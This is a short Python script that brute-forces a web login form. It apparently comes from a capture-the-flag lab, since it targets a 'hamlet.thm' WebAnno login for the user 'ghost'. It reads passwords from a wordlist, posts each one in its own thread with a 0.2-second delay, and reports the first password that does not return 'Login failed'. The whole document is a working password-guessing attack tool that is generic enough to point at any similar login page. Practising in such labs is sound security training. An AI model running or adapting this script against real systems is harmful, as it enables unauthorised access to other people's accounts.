#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

class Bruteforcer:
    def __init__(self, url, username):
        self.__url = url
        self.__username = username

    def sendRequest(self, password):
        loginData = {
            'urlfragment': '',
            'username': self.__username,
            'password': password
        }

        requestResult = requests.post(self.__url, data=loginData)
        print(f'[*] Trying password: {password:15s}', end='\r')

        if 'Login failed' not in requestResult.text:
            print(f'[+] Found valid credentials: {self.__username}:{password}')
            exit()

def main():
    url = 'http://hamlet.thm:8080/login.html?-1.-loginForm'
    username = 'ghost'
    bruteforcer = Bruteforcer(url, username)
    
    wordlist = 'password_hamlet.txt'

    with open(wordlist, 'r') as file:
        for line in file:
            password = line.strip()

            thread = Thread(target=bruteforcer.sendRequest, args=(password,))
            thread.start()

            # You can adjust how fast of each thread.
            # 0.2s is recommended. Otherwise it'll break target's WebAnno.
            sleep(0.2)

if __name__ == '__main__':
    main()
